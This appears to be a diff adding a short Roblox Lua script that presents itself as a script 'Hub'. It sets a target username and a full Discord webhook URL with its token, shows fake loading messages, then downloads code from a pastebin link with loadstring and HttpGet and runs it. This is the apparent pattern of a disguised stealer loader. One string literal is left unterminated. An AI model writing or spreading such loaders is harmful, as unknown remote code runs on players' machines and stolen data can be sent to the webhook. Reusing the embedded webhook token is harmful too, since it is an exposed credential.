@@ -1,0 +1,8 @@
+User = "Odkdbfbfj"
+Webhook = "https://discord.com/api/webhooks/1060590855804702781/s4s-_MO9lgBjnyFL_CjGJ9LoXjNbRoT9kl11wW2fIh3TAZZNLrSIacH8m39FY2Mtgyds"
+_G.CustomScriptName = "Dont Ask Why‘s Hub
+_G.Text1 = "Script loading"
+_G.Text2 = "Script Starting"
+_G.Text3 = "Script starting"
+_G.Text4 = "Script loaded!"
+loadstring(game:HttpGet('https://pastebin.pl/view/raw/1e781430'))()
